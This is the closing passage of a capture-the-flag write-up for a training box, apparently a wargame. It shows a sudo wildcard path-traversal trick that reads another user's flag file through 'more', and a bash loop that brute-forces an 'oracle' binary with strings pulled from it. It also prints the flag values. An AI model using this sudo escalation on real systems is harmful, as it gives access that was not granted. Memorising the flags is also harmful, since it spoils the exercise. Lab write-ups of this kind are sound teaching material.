drwxrwx--- 2 level8 level8 4096 Jan 12 00:53 Videos/
```

```bash
level8@the-box:~$ sudo -l
Matching Defaults entries for level8 on the-box:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User level8 may run the following commands on the-box:
    (level9) NOPASSWD: /usr/bin/more /opt/level9/*
```

Well...
```bash
level8@the-box:~$ sudo -u level9 /usr/bin/more /opt/level9/../../f/l/a/g/s/level9 
FLAG{ef895a84a8e10837dde7780b7}
```

## level9:

`Can you trick the oracle?`
We've done this before didn't we?
```bash
level9@the-box:~$ find . -name oracle -type f
./Desktop/oracle
```

```bash
level9@the-box:~$ strings Desktop/oracle 
/lib64/ld-linux-x86-64.so.2
jp?k[
mgUa
[...]
```

No flag tho... Maybe the password will be in this?
```bash
strings oracle > ../test
```

I refuse to do this by hand since well...
```bash
level9@the-box:~$ strings Desktop/oracle |wc -l
92
```

92 passwords. Hell no.
```bash
level9@the-box:~$ strings Desktop/oracle > test
```

Then, run this script
```
#!/bin/bash
while IFS= read -r pain
do
        echo $pain | /home/level9/Desktop/oracle
done < "/home/level9/test"
```
to find
`FLAG{cfde3e342ac38e5e791df93a8}`
:D

# Conclusion
This was a really fun track. Thanks again to [J3rome](https://github.com/J3rome) 